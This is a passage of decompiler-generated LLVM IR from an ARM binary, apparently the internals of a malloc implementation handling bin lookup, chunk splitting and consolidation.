dec_label_pc_259f4:                               ; preds = %bb140
  %v2_259f4 = icmp eq i32 %v2_259e4, 0
  br i1 %v2_259f4, label %dec_label_pc_259fc, label %dec_label_pc_25de0

dec_label_pc_259fc:                               ; preds = %dec_label_pc_259f4
  %v0_259fc = call i32 @__malloc_consolidate()
  store i32 %v0_259fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25de0

dec_label_pc_25a04:                               ; preds = %bb140
  %v0_25a04 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_25a04, %v2_259e4
  br i1 %tmp201, label %dec_label_pc_25a2c, label %dec_label_pc_25a0c

dec_label_pc_25a0c:                               ; preds = %dec_label_pc_25a04
  %v1_25a0c = add i32 %v4_259e0, -4
  store i32 %v1_25a0c, i32* %r1.global-to-local, align 4
  %v3_25a10 = udiv i32 %v0_25a04, 8
  store i32 %v3_25a10, i32* %r2.global-to-local, align 4
  %v4_25a14 = mul nuw i32 %v3_25a10, 4
  %v5_25a14 = add i32 %v4_25a14, %v1_25a0c
  %v6_25a14 = inttoptr i32 %v5_25a14 to i32*
  %v7_25a14 = load i32, i32* %v6_25a14, align 4
  store i32 %v7_25a14, i32* %r0.global-to-local, align 4
  %v2_25a18 = icmp eq i32 %v7_25a14, 0
  br i1 %v2_25a18, label %dec_label_pc_25a2c, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_25a0c
  %v2_25a1c = add i32 %v7_25a14, 8
  %v3_25a1c = inttoptr i32 %v2_25a1c to i32*
  %v4_25a1c = load i32, i32* %v3_25a1c, align 4
  store i32 %v4_25a1c, i32* %r3.global-to-local, align 4
  store i32 %v2_25a1c, i32* %r0.global-to-local, align 4
  store i32 %v2_25a1c, i32* %r4.global-to-local, align 4
  store i32 %v4_25a1c, i32* %v6_25a14, align 4
  br label %dec_label_pc_26234

dec_label_pc_25a2c:                               ; preds = %dec_label_pc_25a0c, %dec_label_pc_25a04
  %tmp202 = icmp ugt i32 %v0_25a04, 255
  br i1 %tmp202, label %dec_label_pc_25a7c, label %dec_label_pc_25a34

dec_label_pc_25a34:                               ; preds = %dec_label_pc_25a2c
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %ip.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_25a3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  %v3_25a40 = udiv i32 %v0_25a04, 8
  store i32 %v3_25a40, i32* @r7, align 4
  %v4_25a44 = mul nuw i32 %v3_25a40, 8
  %v5_25a44 = add i32 %v4_25a3c, %v4_25a44
  store i32 %v5_25a44, i32* %r3.global-to-local, align 4
  %v1_25a48 = add i32 %v5_25a44, 44
  store i32 %v1_25a48, i32* %ip.global-to-local, align 4
  %v1_25a4c = add i32 %v5_25a44, 56
  %v2_25a4c = inttoptr i32 %v1_25a4c to i32*
  %v3_25a4c = load i32, i32* %v2_25a4c, align 4
  store i32 %v3_25a4c, i32* %r0.global-to-local, align 4
  %v9_25a50 = icmp eq i32 %v3_25a4c, %v1_25a48
  br i1 %v9_25a50, label %dec_label_pc_25bdc, label %dec_label_pc_25a58

dec_label_pc_25a58:                               ; preds = %dec_label_pc_25a34
  %v2_25a58 = add i32 %v3_25a4c, %v0_25a04
  store i32 %v2_25a58, i32* %r3.global-to-local, align 4
  %v1_25a5c = add i32 %v2_25a58, 4
  %v2_25a5c = inttoptr i32 %v1_25a5c to i32*
  %v3_25a5c = load i32, i32* %v2_25a5c, align 4
  store i32 %v3_25a5c, i32* %r2.global-to-local, align 4
  %v1_25a60 = add i32 %v3_25a4c, 12
  %v2_25a60 = inttoptr i32 %v1_25a60 to i32*
  %v3_25a60 = load i32, i32* %v2_25a60, align 4
  store i32 %v3_25a60, i32* %r1.global-to-local, align 4
  %v1_25a64 = or i32 %v3_25a5c, 1
  store i32 %v1_25a64, i32* %r2.global-to-local, align 4
  %v1_25a68 = add i32 %v3_25a4c, 8
  store i32 %v1_25a68, i32* %r4.global-to-local, align 4
  store i32 %v1_25a64, i32* %v2_25a5c, align 4
  %v0_25a70 = load i32, i32* %ip.global-to-local, align 4
  %v1_25a70 = load i32, i32* %r1.global-to-local, align 4
  %v2_25a70 = add i32 %v1_25a70, 8
  %v3_25a70 = inttoptr i32 %v2_25a70 to i32*
  store i32 %v0_25a70, i32* %v3_25a70, align 4
  %v0_25a74 = load i32, i32* %r1.global-to-local, align 4
  %v1_25a74 = load i32, i32* %ip.global-to-local, align 4
  %v2_25a74 = add i32 %v1_25a74, 12
  %v3_25a74 = inttoptr i32 %v2_25a74 to i32*
  store i32 %v0_25a74, i32* %v3_25a74, align 4
  br label %dec_label_pc_26234

dec_label_pc_25a7c:                               ; preds = %dec_label_pc_25a2c
  store i32 %v0_25a04, i32* %r0.global-to-local, align 4
  %v1_25a80 = call i32 @__malloc_largebin_index(i32 %v0_25a04)
  store i32 %v1_25a80, i32* %r0.global-to-local, align 4
  %v0_25a84 = load i32, i32* @r4, align 4
  %v1_25a84 = and i32 %v0_25a84, 2
  %v2_25a84 = icmp eq i32 %v1_25a84, 0
  store i32 %v1_25a80, i32* @r7, align 4
  br i1 %v2_25a84, label %dec_label_pc_25bdc, label %dec_label_pc_25a90

dec_label_pc_25a90:                               ; preds = %dec_label_pc_25a7c
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r1.global-to-local, align 4
  %v4_25a98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_25a98, i32* @r0, align 4
  %v0_25a9c = call i32 @__malloc_consolidate()
  store i32 %v0_25a9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25bdc

dec_label_pc_25aa4:                               ; preds = %dec_label_pc_25bf0
  %v1_25aa4 = add i32 %v3_25bf0, 4
  %v2_25aa4 = inttoptr i32 %v1_25aa4 to i32*
  %v3_25aa4 = load i32, i32* %v2_25aa4, align 4
  store i32 %v3_25aa4, i32* %r3.global-to-local, align 4
  %v0_25aa8 = load i32, i32* @sl, align 4
  %v1_25aac = and i32 %v3_25aa4, -4
  store i32 %v1_25aac, i32* %r4.global-to-local, align 4
  %v1_25ab0 = add i32 %v3_25bf0, 12
  %v2_25ab0 = inttoptr i32 %v1_25ab0 to i32*
  %v3_25ab0 = load i32, i32* %v2_25ab0, align 4
  store i32 %v3_25ab0, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_25aa8, 255
  br i1 %tmp203, label %dec_label_pc_25b0c, label %dec_label_pc_25ab8

dec_label_pc_25ab8:                               ; preds = %dec_label_pc_25aa4
  %v9_25ab8 = icmp eq i32 %v3_25ab0, %v0_25b10
  br i1 %v9_25ab8, label %dec_label_pc_25ac0, label %dec_label_pc_25b0c

dec_label_pc_25ac0:                               ; preds = %dec_label_pc_25ab8
  %v0_25ac0 = load i32, i32* @sb, align 4
  %v1_25ac0 = add i32 %v0_25ac0, 48
  %v2_25ac0 = inttoptr i32 %v1_25ac0 to i32*
  %v3_25ac0 = load i32, i32* %v2_25ac0, align 4
  store i32 %v3_25ac0, i32* %r3.global-to-local, align 4
  %v9_25ac4 = icmp eq i32 %v3_25bf0, %v3_25ac0
  br i1 %v9_25ac4, label %dec_label_pc_25acc, label %dec_label_pc_25b0c

dec_label_pc_25acc:                               ; preds = %dec_label_pc_25ac0
  %v1_25acc = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_25aac, %v1_25acc
  br i1 %tmp204, label %dec_label_pc_25ad4, label %dec_label_pc_25b0c

dec_label_pc_25ad4:                               ; preds = %dec_label_pc_25acc
  %v2_25ad4 = sub i32 %v1_25aac, %v0_25aa8
  store i32 %v2_25ad4, i32* %r2.global-to-local, align 4
  %v2_25ad8 = add i32 %v0_25aa8, %v3_25bf0
  store i32 %v2_25ad8, i32* %r3.global-to-local, align 4
  %v1_25adc = or i32 %v0_25aa8, 1
  store i32 %v1_25adc, i32* %r0.global-to-local, align 4
  %v1_25ae0 = or i32 %v2_25ad4, 1
  store i32 %v1_25ae0, i32* %r1.global-to-local, align 4
  %v1_25ae4 = add i32 %v3_25bf0, 8
  store i32 %v1_25ae4, i32* %r4.global-to-local, align 4
  %v2_25ae8 = add i32 %v0_25b10, 8
  %v3_25ae8 = inttoptr i32 %v2_25ae8 to i32*
  store i32 %v2_25ad8, i32* %v3_25ae8, align 4
  %v0_25aec = load i32, i32* %r3.global-to-local, align 4
  %v1_25aec = load i32, i32* %ip.global-to-local, align 4
  %v2_25aec = add i32 %v1_25aec, 12
  %v3_25aec = inttoptr i32 %v2_25aec to i32*
  store i32 %v0_25aec, i32* %v3_25aec, align 4
  %v0_25af0 = load i32, i32* %r0.global-to-local, align 4
  %v1_25af0 = load i32, i32* @r6, align 4
  %v2_25af0 = add i32 %v1_25af0, 4
  %v3_25af0 = inttoptr i32 %v2_25af0 to i32*
  store i32 %v0_25af0, i32* %v3_25af0, align 4
  %v0_25af4 = load i32, i32* %r3.global-to-local, align 4
  %v1_25af4 = load i32, i32* @sb, align 4
  %v2_25af4 = add i32 %v1_25af4, 48
  %v3_25af4 = inttoptr i32 %v2_25af4 to i32*
  store i32 %v0_25af4, i32* %v3_25af4, align 4
  %v0_25af8 = load i32, i32* %r2.global-to-local, align 4
  %v1_25af8 = load i32, i32* %r3.global-to-local, align 4
  %v3_25af8 = add i32 %v1_25af8, %v0_25af8
  %v4_25af8 = inttoptr i32 %v3_25af8 to i32*
  store i32 %v0_25af8, i32* %v4_25af8, align 4
  %v0_25afc = load i32, i32* %r1.global-to-local, align 4
  %v1_25afc = load i32, i32* %r3.global-to-local, align 4
  %v2_25afc = add i32 %v1_25afc, 4
  %v3_25afc = inttoptr i32 %v2_25afc to i32*
  store i32 %v0_25afc, i32* %v3_25afc, align 4
  %v0_25b00 = load i32, i32* %ip.global-to-local, align 4
  %v1_25b00 = load i32, i32* %r3.global-to-local, align 4
  %v2_25b00 = add i32 %v1_25b00, 12
  %v3_25b00 = inttoptr i32 %v2_25b00 to i32*
  store i32 %v0_25b00, i32* %v3_25b00, align 4
  %v0_25b04 = load i32, i32* %ip.global-to-local, align 4
  %v1_25b04 = load i32, i32* %r3.global-to-local, align 4
  %v2_25b04 = add i32 %v1_25b04, 8
  %v3_25b04 = inttoptr i32 %v2_25b04 to i32*
  store i32 %v0_25b04, i32* %v3_25b04, align 4
  br label %dec_label_pc_26234

dec_label_pc_25b0c:                               ; preds = %dec_label_pc_25acc, %dec_label_pc_25ac0, %dec_label_pc_25ab8, %dec_label_pc_25aa4
  %v9_25b0c = icmp eq i32 %v1_25aac, %v0_25aa8
  %v2_25b10 = add i32 %v3_25ab0, 8
  %v3_25b10 = inttoptr i32 %v2_25b10 to i32*
  store i32 %v0_25b10, i32* %v3_25b10, align 4
  %v0_25b14 = load i32, i32* %ip.global-to-local, align 4
  %v1_25b14 = load i32, i32* %r5.global-to-local, align 4
  %v2_25b14 = add i32 %v1_25b14, 12
  %v3_25b14 = inttoptr i32 %v2_25b14 to i32*
  store i32 %v0_25b14, i32* %v3_25b14, align 4
  br i1 %v9_25b0c, label %dec_label_pc_25c6c.loopexit, label %dec_label_pc_25b28

dec_label_pc_25b28:                               ; preds = %dec_label_pc_25b0c
  %v0_25b28 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_25b28, 255
  br i1 %tmp205, label %dec_label_pc_25b4c, label %dec_label_pc_25b30

dec_label_pc_25b30:                               ; preds = %dec_label_pc_25b28
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  %v1_25b34 = load i32, i32* %r8.global-to-local, align 4
  %v2_25b34 = add i32 %v1_25b34, ptrtoint (i32* @global_var_428d0.3044 to i32)
  %v3_25b34 = inttoptr i32 %v2_25b34 to i32*
  %v4_25b34 = load i32, i32* %v3_25b34, align 4
  %v3_25b38 = udiv i32 %v0_25b28, 8
  store i32 %v3_25b38, i32* %r0.global-to-local, align 4
  %v4_25b3c = mul nuw i32 %v3_25b38, 8
  %v5_25b3c = add i32 %v4_25b34, %v4_25b3c
  store i32 %v5_25b3c, i32* %r3.global-to-local, align 4
  %v1_25b40 = add i32 %v5_25b3c, 44
  store i32 %v1_25b40, i32* %ip.global-to-local, align 4
  %v1_25b44 = add i32 %v5_25b3c, 52
  %v2_25b44 = inttoptr i32 %v1_25b44 to i32*
  %v3_25b44 = load i32, i32* %v2_25b44, align 4
  store i32 %v3_25b44, i32* @lr, align 4
  br label %dec_label_pc_25ba4

dec_label_pc_25b4c:                               ; preds = %dec_label_pc_25b28
  store i32 %v0_25b28, i32* %r0.global-to-local, align 4
  %v1_25b50 = call i32 @__malloc_largebin_index(i32 %v0_25b28)
  store i32 %v1_25b50, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %ip.global-to-local, align 4
  %v1_25b58 = load i32, i32* %r8.global-to-local, align 4
  %v2_25b58 = add i32 %v1_25b58, ptrtoint (i32* @global_var_428d0.3044 to i32)
  %v3_25b58 = inttoptr i32 %v2_25b58 to i32*
  %v4_25b58 = load i32, i32* %v3_25b58, align 4
  %v4_25b5c = mul i32 %v1_25b50, 8
  %v5_25b5c = add i32 %v4_25b58, %v4_25b5c
  store i32 %v5_25b5c, i32* %r3.global-to-local, align 4
  %v1_25b60 = add i32 %v5_25b5c, 44
  store i32 %v1_25b60, i32* %ip.global-to-local, align 4
  %v1_25b64 = add i32 %v5_25b5c, 52
  %v2_25b64 = inttoptr i32 %v1_25b64 to i32*
  %v3_25b64 = load i32, i32* %v2_25b64, align 4
  store i32 %v3_25b64, i32* @lr, align 4
  %v9_25b68 = icmp eq i32 %v3_25b64, %v1_25b60
  br i1 %v9_25b68, label %dec_label_pc_25ba4, label %dec_label_pc_25b70

dec_label_pc_25b70:                               ; preds = %dec_label_pc_25b4c
  %v1_25b70 = add i32 %v5_25b5c, 56
  %v2_25b70 = inttoptr i32 %v1_25b70 to i32*
  %v3_25b70 = load i32, i32* %v2_25b70, align 4
  store i32 %v3_25b70, i32* %r1.global-to-local, align 4
  %v1_25b74 = add i32 %v3_25b70, 4
  %v2_25b74 = inttoptr i32 %v1_25b74 to i32*
  %v3_25b74 = load i32, i32* %v2_25b74, align 4
  store i32 %v3_25b74, i32* %r3.global-to-local, align 4
  %v0_25b78 = load i32, i32* %r4.global-to-local, align 4
  %v3_25b78 = icmp ult i32 %v0_25b78, %v3_25b74
  br i1 %v3_25b78, label %.thread, label %dec_label_pc_25b94.preheader

.thread:                                          ; preds = %dec_label_pc_25b70
  store i32 %v1_25b60, i32* @lr, align 4
  store i32 %v3_25b70, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_25ba4

dec_label_pc_25b94.preheader:                     ; preds = %dec_label_pc_25b70
  %v2_25b80 = or i32 %v0_25b78, 1
  store i32 %v2_25b80, i32* %r2.global-to-local, align 4
  %v1_25b94179 = add i32 %v3_25b64, 4
  %v2_25b94180 = inttoptr i32 %v1_25b94179 to i32*
  %v3_25b94181 = load i32, i32* %v2_25b94180, align 4
  store i32 %v3_25b94181, i32* %r3.global-to-local, align 4
  %v3_25b98183 = icmp ult i32 %v2_25b80, %v3_25b94181
  br i1 %v3_25b98183, label %dec_label_pc_25b90, label %dec_label_pc_25ba0

dec_label_pc_25b90:                               ; preds = %dec_label_pc_25b94.preheader, %dec_label_pc_25b90
  %v0_25ba0184 = phi i32 [ %v3_25b90, %dec_label_pc_25b90 ], [ %v3_25b64, %dec_label_pc_25b94.preheader ]
  %v1_25b90 = add i32 %v0_25ba0184, 8
  %v2_25b90 = inttoptr i32 %v1_25b90 to i32*
  %v3_25b90 = load i32, i32* %v2_25b90, align 4
  store i32 %v3_25b90, i32* @lr, align 4
  %v1_25b94 = add i32 %v3_25b90, 4
  %v2_25b94 = inttoptr i32 %v1_25b94 to i32*
  %v3_25b94 = load i32, i32* %v2_25b94, align 4
  store i32 %v3_25b94, i32* %r3.global-to-local, align 4
  %v3_25b98 = icmp ult i32 %v2_25b80, %v3_25b94
  br i1 %v3_25b98, label %dec_label_pc_25b90, label %dec_label_pc_25ba0

dec_label_pc_25ba0:                               ; preds = %dec_label_pc_25b90, %dec_label_pc_25b94.preheader
  %v0_25ba0.lcssa = phi i32 [ %v3_25b64, %dec_label_pc_25b94.preheader ], [ %v3_25b90, %dec_label_pc_25b90 ]
  %v1_25ba0 = add i32 %v0_25ba0.lcssa, 12
  %v2_25ba0 = inttoptr i32 %v1_25ba0 to i32*
  %v3_25ba0 = load i32, i32* %v2_25ba0, align 4
  store i32 %v3_25ba0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_25ba4

dec_label_pc_25ba4:                               ; preds = %.thread, %dec_label_pc_25b4c, %dec_label_pc_25b30, %dec_label_pc_25ba0
  %v0_25bc4 = phi i32 [ %v1_25b60, %dec_label_pc_25b4c ], [ %v1_25b40, %dec_label_pc_25b30 ], [ %v3_25ba0, %dec_label_pc_25ba0 ], [ %v3_25b70, %.thread ]
  %v0_25bb8 = phi i32 [ %v1_25b50, %dec_label_pc_25b4c ], [ %v3_25b38, %dec_label_pc_25b30 ], [ %v1_25b50, %dec_label_pc_25ba0 ], [ %v1_25b50, %.thread ]
  %v1_25ba8 = phi i32 [ %v1_25b58, %dec_label_pc_25b4c ], [ %v1_25b34, %dec_label_pc_25b30 ], [ %v1_25b58, %dec_label_pc_25ba0 ], [ %v1_25b58, %.thread ]
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  %v2_25ba8 = add i32 %v1_25ba8, ptrtoint (i32* @global_var_428d0.3044 to i32)
  %v3_25ba8 = inttoptr i32 %v2_25ba8 to i32*
  %v4_25ba8 = load i32, i32* %v3_25ba8, align 4
  %v3_25bac = sdiv i32 %v0_25bb8, 32
  store i32 %v3_25bac, i32* %r3.global-to-local, align 4
  %v4_25bb0 = mul nsw i32 %v3_25bac, 4
  %v5_25bb0 = add i32 %v4_25ba8, %v4_25bb0
  store i32 %v5_25bb0, i32* %r1.global-to-local, align 4
  %v1_25bb4 = add i32 %v5_25bb0, 820
  %v2_25bb4 = inttoptr i32 %v1_25bb4 to i32*
  %v3_25bb4 = load i32, i32* %v2_25bb4, align 4
  %v1_25bb8 = urem i32 %v0_25bb8, 32
  store i32 %v1_25bb8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_25bc0 = shl i32 1, %v1_25bb8
  %v8_25bc0 = or i32 %v3_25bb4, %v7_25bc0
  store i32 %v8_25bc0, i32* %r3.global-to-local, align 4
  %v1_25bc4 = load i32, i32* @r6, align 4
  %v2_25bc4 = add i32 %v1_25bc4, 12
  %v3_25bc4 = inttoptr i32 %v2_25bc4 to i32*
  store i32 %v0_25bc4, i32* %v3_25bc4, align 4
  %v0_25bc8 = load i32, i32* @lr, align 4
  %v1_25bc8 = load i32, i32* @r6, align 4
  %v2_25bc8 = add i32 %v1_25bc8, 8
  %v3_25bc8 = inttoptr i32 %v2_25bc8 to i32*
  store i32 %v0_25bc8, i32* %v3_25bc8, align 4
  %v0_25bcc = load i32, i32* %r3.global-to-local, align 4
  %v1_25bcc = load i32, i32* %r1.global-to-local, align 4
  %v2_25bcc = add i32 %v1_25bcc, 820
  %v3_25bcc = inttoptr i32 %v2_25bcc to i32*
  store i32 %v0_25bcc, i32* %v3_25bcc, align 4
  %v0_25bd0 = load i32, i32* @r6, align 4
  %v1_25bd0 = load i32, i32* @lr, align 4
  %v2_25bd0 = add i32 %v1_25bd0, 12
  %v3_25bd0 = inttoptr i32 %v2_25bd0 to i32*
  store i32 %v0_25bd0, i32* %v3_25bd0, align 4
  %v0_25bd4 = load i32, i32* @r6, align 4
  %v1_25bd4 = load i32, i32* %ip.global-to-local, align 4
  %v2_25bd4 = add i32 %v1_25bd4, 8
  %v3_25bd4 = inttoptr i32 %v2_25bd4 to i32*
  store i32 %v0_25bd4, i32* %v3_25bd4, align 4
  %v0_25bf0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_25bf0

dec_label_pc_25bdc:                               ; preds = %dec_label_pc_25a7c, %dec_label_pc_25a34, %dec_label_pc_25a90
  store i32 72, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r1.global-to-local, align 4
  %v4_25be4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_25be4, i32* @sb, align 4
  %v0_25be8 = load i32, i32* @sl, align 4
  %v1_25be8 = add i32 %v0_25be8, 16
  store i32 %v1_25be8, i32* @fp, align 4
  %v1_25bec = add i32 %v4_25be4, 52
  store i32 %v1_25bec, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_25bf0

dec_label_pc_25bf0:                               ; preds = %dec_label_pc_25ba4, %dec_label_pc_25bdc
  %v0_25b10 = phi i32 [ %v0_25bf0.pre, %dec_label_pc_25ba4 ], [ %v1_25bec, %dec_label_pc_25bdc ]
  %v1_25bf0 = add i32 %v0_25b10, 12
  %v2_25bf0 = inttoptr i32 %v1_25bf0 to i32*
  %v3_25bf0 = load i32, i32* %v2_25bf0, align 4
  store i32 %v3_25bf0, i32* @r6, align 4
  %v9_25bf4 = icmp eq i32 %v3_25bf0, %v0_25b10
  br i1 %v9_25bf4, label %dec_label_pc_25bfc, label %dec_label_pc_25aa4

dec_label_pc_25bfc:                               ; preds = %dec_label_pc_25bf0
  %v0_25bfc = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_25bfc, 256
  %v0_25cb4.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_25bfc.dec_label_pc_25cb4_crit_edge, label %dec_label_pc_25c04

dec_label_pc_25bfc.dec_label_pc_25cb4_crit_edge:  ; preds = %dec_label_pc_25bfc
  %.pre200 = mul i32 %v0_25cb4.pre, 8
  br label %dec_label_pc_25cb4

dec_label_pc_25c04:                               ; preds = %dec_label_pc_25bfc
  %v4_25c04 = mul i32 %v0_25cb4.pre, 8
  %v5_25c04 = add i32 %v4_25c04, %v0_25b10
  store i32 %v5_25c04, i32* %r3.global-to-local, align 4
  %v1_25c08 = add i32 %v5_25c04, -8
  store i32 %v1_25c08, i32* %r1.global-to-local, align 4
  %v1_25c0c = add i32 %v5_25c04, 4
  %v2_25c0c = inttoptr i32 %v1_25c0c to i32*
  %storemerge.pre = load i32, i32* %v2_25c0c, align 4
  br label %dec_label_pc_25cac

dec_label_pc_25c14:                               ; preds = %dec_label_pc_25cac
  %v1_25c14 = add i32 %v1_25c3c, 4
  %v2_25c14 = inttoptr i32 %v1_25c14 to i32*
  %v3_25c14 = load i32, i32* %v2_25c14, align 4
  store i32 %v3_25c14, i32* %r3.global-to-local, align 4
  %v1_25c18 = and i32 %v3_25c14, -4
  store i32 %v1_25c18, i32* %r2.global-to-local, align 4
  %v3_25c1c = icmp ult i32 %v1_25c18, %v0_25bfc
  %v1_25c20 = add i32 %v1_25c3c, 12
  %v2_25c20 = inttoptr i32 %v1_25c20 to i32*
  %v3_25c20 = load i32, i32* %v2_25c20, align 4
  store i32 %v3_25c20, i32* %r0.global-to-local, align 4
  br i1 %v3_25c1c, label %dec_label_pc_25cac, label %dec_label_pc_25c28

dec_label_pc_25c28:                               ; preds = %dec_label_pc_25c14
  %v1_25c28 = add i32 %v1_25c3c, 8
  %v2_25c28 = inttoptr i32 %v1_25c28 to i32*
  %v3_25c28 = load i32, i32* %v2_25c28, align 4
  store i32 %v3_25c28, i32* %r1.global-to-local, align 4
  %v1_25c2c = add i32 %v3_25c28, 12
  %v2_25c2c = inttoptr i32 %v1_25c2c to i32*
  %v3_25c2c = load i32, i32* %v2_25c2c, align 4
  store i32 %v3_25c2c, i32* %r3.global-to-local, align 4
  %v9_25c30 = icmp eq i32 %v3_25c2c, %v1_25c3c
  br i1 %v9_25c30, label %dec_label_pc_25c38, label %dec_label_pc_25c44

dec_label_pc_25c38:                               ; preds = %dec_label_pc_25c28
  %v1_25c38 = add i32 %v3_25c20, 8
  %v2_25c38 = inttoptr i32 %v1_25c38 to i32*
  %v3_25c38 = load i32, i32* %v2_25c38, align 4
  store i32 %v3_25c38, i32* %r3.global-to-local, align 4
  %v9_25c3c = icmp eq i32 %v3_25c38, %v1_25c3c
  br i1 %v9_25c3c, label %dec_label_pc_25c48, label %dec_label_pc_25c44

dec_label_pc_25c44:                               ; preds = %dec_label_pc_25c28, %dec_label_pc_25c38
  %v0_25c44 = call i32 @abort()
  store i32 %v0_25c44, i32* %r0.global-to-local, align 4
  %v0_25c48.pre = load i32, i32* @sl, align 4
  %v1_25c48.pre = load i32, i32* @r2, align 4
  %v0_25c50.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_25c48

dec_label_pc_25c48:                               ; preds = %dec_label_pc_25c38, %dec_label_pc_25c44
  %v1_25c50 = phi i32 [ %v3_25c20, %dec_label_pc_25c38 ], [ %v0_25c44, %dec_label_pc_25c44 ]
  %v0_25c50 = phi i32 [ %v3_25c28, %dec_label_pc_25c38 ], [ %v0_25c50.pre, %dec_label_pc_25c44 ]
  %v1_25c48 = phi i32 [ %v1_25c18, %dec_label_pc_25c38 ], [ %v1_25c48.pre, %dec_label_pc_25c44 ]
  %v0_25c48 = phi i32 [ %v0_25bfc, %dec_label_pc_25c38 ], [ %v0_25c48.pre, %dec_label_pc_25c44 ]
  %v2_25c48 = sub i32 %v1_25c48, %v0_25c48
  store i32 %v2_25c48, i32* %lr.global-to-local, align 4
  %v2_25c50 = add i32 %v1_25c50, 8
  %v3_25c50 = inttoptr i32 %v2_25c50 to i32*
  store i32 %v0_25c50, i32* %v3_25c50, align 4
  %v0_25c54 = load i32, i32* %r0.global-to-local, align 4
  %v1_25c54 = load i32, i32* %r1.global-to-local, align 4
  %v2_25c54 = add i32 %v1_25c54, 12
  %v3_25c54 = inttoptr i32 %v2_25c54 to i32*
  store i32 %v0_25c54, i32* %v3_25c54, align 4
  %v0_25c58 = load i32, i32* %ip.global-to-local, align 4
  %v1_25c58 = add i32 %v0_25c58, 8
  store i32 %v1_25c58, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_25c48, 15
  br i1 %tmp207, label %dec_label_pc_25c78, label %dec_label_pc_25c60

dec_label_pc_25c60:                               ; preds = %dec_label_pc_25c48
  %v1_25c60 = load i32, i32* %r2.global-to-local, align 4
  %v2_25c60 = add i32 %v1_25c60, %v0_25c58
  store i32 %v2_25c60, i32* %r2.global-to-local, align 4
  %v1_25c64 = add i32 %v2_25c60, 4
  %v2_25c64 = inttoptr i32 %v1_25c64 to i32*
  %v3_25c64 = load i32, i32* %v2_25c64, align 4
  store i32 %v3_25c64, i32* %r3.global-to-local, align 4
  store i32 %v1_25c58, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_25c6c

dec_label_pc_25c6c.loopexit:                      ; preds = %dec_label_pc_25b0c
  %v1_25b18 = load i32, i32* @r6, align 4
  %v2_25b18 = load i32, i32* @sl, align 4
  %v3_25b18 = add i32 %v2_25b18, %v1_25b18
  store i32 %v3_25b18, i32* %r2.global-to-local, align 4
  %v2_25b1c = add i32 %v3_25b18, 4
  %v3_25b1c = inttoptr i32 %v2_25b1c to i32*
  %v4_25b1c = load i32, i32* %v3_25b1c, align 4
  store i32 %v4_25b1c, i32* %r3.global-to-local, align 4
  %v2_25b20 = add i32 %v1_25b18, 8
  store i32 %v2_25b20, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_25c6c

dec_label_pc_25c6c:                               ; preds = %.dec_label_pc_25c6c_crit_edge, %dec_label_pc_25c6c.loopexit, %dec_label_pc_25c60
  %v1_25c70 = phi i32 [ %v4_25d94, %.dec_label_pc_25c6c_crit_edge ], [ %v3_25b18, %dec_label_pc_25c6c.loopexit ], [ %v2_25c60, %dec_label_pc_25c60 ]
  %v0_25c6c = phi i32 [ %v7_25d94, %.dec_label_pc_25c6c_crit_edge ], [ %v4_25b1c, %dec_label_pc_25c6c.loopexit ], [ %v3_25c64, %dec_label_pc_25c60 ]
  %v1_25c6c = or i32 %v0_25c6c, 1
  store i32 %v1_25c6c, i32* %r3.global-to-local, align 4
  %v2_25c70 = add i32 %v1_25c70, 4
  %v3_25c70 = inttoptr i32 %v2_25c70 to i32*
  store i32 %v1_25c6c, i32* %v3_25c70, align 4
  br label %dec_label_pc_26234

dec_label_pc_25c78:                               ; preds = %dec_label_pc_25c48
  %v1_25c78 = load i32, i32* @sl, align 4
  %v2_25c78 = add i32 %v1_25c78, %v0_25c58
  store i32 %v2_25c78, i32* %r2.global-to-local, align 4
  %v1_25c7c = or i32 %v1_25c78, 1
  store i32 %v1_25c7c, i32* %r3.global-to-local, align 4
  %v0_25c80 = load i32, i32* %lr.global-to-local, align 4
  %v1_25c80 = or i32 %v0_25c80, 1
  store i32 %v1_25c80, i32* %r1.global-to-local, align 4
  store i32 %v1_25c58, i32* %r4.global-to-local, align 4
  %v2_25c88 = add i32 %v0_25c58, 4
  %v3_25c88 = inttoptr i32 %v2_25c88 to i32*
  store i32 %v1_25c7c, i32* %v3_25c88, align 4
  %v0_25c8c = load i32, i32* %r2.global-to-local, align 4
  %v1_25c8c = load i32, i32* @r6, align 4
  %v2_25c8c = add i32 %v1_25c8c, 8
  %v3_25c8c = inttoptr i32 %v2_25c8c to i32*
  store i32 %v0_25c8c, i32* %v3_25c8c, align 4
  %v0_25c90 = load i32, i32* %r2.global-to-local, align 4
  %v1_25c90 = load i32, i32* @r6, align 4
